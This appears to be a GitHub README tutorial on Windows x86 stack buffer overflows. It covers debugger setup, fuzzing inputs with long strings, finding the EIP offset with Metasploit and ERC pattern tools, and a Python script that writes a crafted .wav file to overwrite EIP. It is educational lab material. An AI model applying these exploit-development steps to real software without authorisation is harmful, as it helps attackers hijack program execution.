# Windows-Stack-overflow-basics

This is a small repo for Windows Stack-Based Buffer overflow(x86).
<br>

* [Lab Setup](#lab-setup)
<br>

* [Identify the vulnerable field](#reconnaissance)
<br>

# Lab Setup

For the lab i will use a windows 10 machine with:
<br>

## Decompiler and Debuger
[Cutter](https://cutter.re/)

## Debugger and Patcher
[x64dbg](https://x64dbg.com/)
We just need to download from the site and put it in
```cmd
C:\Program Files\x64dbg\
```

## Buffer Overflow Extension
[ERC](https://github.com/Andy53/ERC.Xdbg)
To install it we just need to download the latest .zip folder from the [release page](https://github.com/Andy53/ERC.Xdbg/releases) and extract in:
```cmd
C:\Program Files\x64dbg\x32\plugins\
```
!BE SURE TO DOWNLOAD THE RIGHT VERSION FOR UR DEBUGGER: \_32 for x86 and \_64 for x64!
Once we have done that we can set the output directory in cmd:
```cmd
ERC --config SetWorkingDirectory C:\Users\%USERNAME%\Desktop\
```
Now we are ready to do some Buffer Overflow:

# Reconnaissance

To exploit a Buffer-Overflow vulnerability we need to find one first.
<br>
To do so we need to start our .exe and attach the process in x32dbg:
<br>
In the top left corner of the debugger just click file and the _attatch_ option with the earth icon and this will pop out:
	
![process attach](./pic/attach-process.png)
	
after attaching the process we need to [fuzz](https://www.wired.com/2016/06/hacker-lexicon-fuzzing/) all the input fields that the programm expose.
<br>
If a programm exposes to many fields just go for the ones that expect the smaller input such as

* Date
* Name
* selection fileds (y\n) (m\f)
* File inputs
To fuzz those Fields i will send the most basic payload generated like this:
```bash
python3 -c "print('A'*1000)" 
```
This is for creating file payloads:
```bash
python3 -c "print('A'*1000, file=open('<file_name>', 'w'))" 
```
Once we have sent the data if the programm crashes we need to check the $EIP register.
<br>

If this register is overwrritten with `4141414141` we succesfully find a possible stack overflow field.
<br>

In fact by overwriting the $EIP (the 32 bit version of the `Istruction pointer`) we can controll what the programm will execute next.
<br>

This register keep track of the last istruction that was called so the programm can _return_ the value and continue the exection from the _address_ pointed from the $EIP.
<br>

Although we overwritten the $EIP we don't know how many chars we sent to trigger only the $EIP.
<br>

In fact in order to execute shell code with a Stack-Overflow we need to controll the address that the $EIP will be overwritten with.
<br>

To do so we will use a pattern to fuzz the input fields. We can create them in many ways like msf:
```bash
msf-pattern_create -l 1000
```
or with ERC in the x32dbg terminal
```cmd
ERC --pattern c 1000
```  
To write those patterns to a file we can write a bunch of python code:
```python
payload = bytes(<erc_output>,"utf-8")
with open('<file_name>', 'wb') as f:
	f.write(payload)
```
We now have our file or text payload to fuzz the input.
Once we overwritten the $EIP we will have a random value in the $EIP.
<br>

To understand what is the $EIP offset we need search the value that we got inside the $EIP.
<br>


For example:
	
![eip overwritten](./pic/eip-ow.png)
	
in this case the $EIP is rewritten with `31684630`
<br>

we need to search this number in the pattern that we created:
```bash
msf-pattern_offset -q 31684630
```
output:
```bash
[*] Exact match at offset 4112
```
If we want to search in ERC we can convert those bytes into ascii:
```python
hex_string = "<eip_bytes>"  
byte_string = bytes.fromhex(hex_string)  
ascii_string = byte_string.decode("ASCII")  
print(ascii_string)  
```
output:
```
1hF0
```
and then search them with:
```cmd
ERC --pattern o 1hF0
```
<br>

Now that we can controll the exact value of the $EIP we need to set it to an arbitrary address like this:
```python
def eip_control():
    offset = 4112  #insert the offset
    buffer = b"A"*offset
    eip = b"B"*4  #chose the address that will be written in $EIP
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload) 	#create a file handle and write the payload

eip_control()	#call the function
```
